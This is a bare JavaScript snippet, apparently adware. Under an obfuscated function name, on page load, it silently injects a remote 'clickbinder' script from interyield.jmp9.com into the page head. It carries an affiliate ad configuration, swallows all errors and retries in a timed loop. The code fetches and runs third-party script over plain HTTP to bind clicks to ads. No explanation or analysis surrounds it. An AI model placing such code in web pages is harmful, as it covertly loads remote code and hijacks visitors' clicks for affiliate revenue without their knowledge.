

nURcjgWHqJWpbiz = function() {
    try {
            InterYieldOptions= [{
   "e": "click",
   "debug": "false",
   "affiliate": "monad4",
   "subid": "pb1_ff",
   "ecpm": "0",
   "snoozeMinutes": "3",
   "maxAdCountsPerInterval": "6",
   "adCountIntervalHours": "24",
   "attributionTitle": "",
   "EndPoint": "http://interyield.jmp9.com"
}] ;
            InterYieldScript = document.createElement("script");
            InterYieldScript.type = "text/javascript";
            InterYieldScript.src = "http://interyield.jmp9.com/InterYield/clickbinder.do?ver=1.0-SNAPSHOT.8%2C879&a=null";
            document.getElementsByTagName("head")[0].appendChild(InterYieldScript);
            delete InterYieldScript;
    } catch (e) { }
};




(function myLoop (i) {  
    setTimeout(function () {   
        if (typeof InterYieldOptions == "undefined" || InterYieldOptions == null ) {
            nURcjgWHqJWpbiz();
            return;
        }
        if (--i) myLoop(i);    
    }, 300)
})(30); 

      

